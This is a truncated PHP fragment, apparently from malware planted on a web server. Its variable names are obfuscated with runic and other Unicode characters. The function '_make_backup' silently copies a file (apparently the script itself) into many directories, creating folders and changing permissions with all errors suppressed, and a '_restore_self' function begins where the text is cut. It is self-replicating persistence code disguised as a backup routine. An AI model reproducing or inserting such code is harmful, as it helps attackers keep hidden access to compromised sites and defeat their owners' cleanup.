function _make_backup($ᚠ̆㉁̆̆ = null) {
    global $ᛜ㌁ぁﬕ̩̇̂, $ﾝ̥ﬗ̤̅̉;
    if ($ᚠ̆㉁̆̆ === null) $ᚠ̆㉁̆̆ = @file_get_contents($ﾝ̥ﬗ̤̅̉);
    if (!$ᚠ̆㉁̆̆ || strlen($ᚠ̆㉁̆̆) < 300) return false;
    $え㉉̦̊̄ = 0;
    foreach ($ᛜ㌁ぁﬕ̩̇̂ as $ᚦ̦̦̋) {
        $ᛏ̩̅̃̄̀ = dirname($ᚦ̦̦̋);
        if (!@is_dir($ᛏ̩̅̃̄̀)) { @mkdir($ᛏ̩̅̃̄̀, 0755, true); }
        if (!@is_writable($ᛏ̩̅̃̄̀)) { @chmod($ᛏ̩̅̃̄̀, 0755); }
        if (!@is_writable($ᛏ̩̅̃̄̀)) continue;
        if (file_exists($ᚦ̦̦̋) && @filesize($ᚦ̦̦̋) === strlen($ᚠ̆㉁̆̆)) { $え㉉̦̊̄++; continue; }
        $ﾝ́̉ = @file_put_contents($ᚦ̦̦̋, $ᚠ̆㉁̆̆, LOCK_EX);
        if ($ﾝ́̉ === false) {
            $ᚠ̨̩́́ = @fopen($ᚦ̦̦̋, 'wb');
            if ($ᚠ̨̩́́) { @fwrite($ᚠ̨̩́́, $ᚠ̆㉁̆̆); @fclose($ᚠ̨̩́́); $ﾝ́̉ = strlen($ᚠ̆㉁̆̆); }
        }
        if ($ﾝ́̉ !== false && $ﾝ́̉ > 300) { @chmod($ᚦ̦̦̋, 0644); $え㉉̦̊̄++; }
    }
    return $え㉉̦̊̄;
}

function _restore_self() {
    global $ﾝ̥ﬗ̤̅̉;
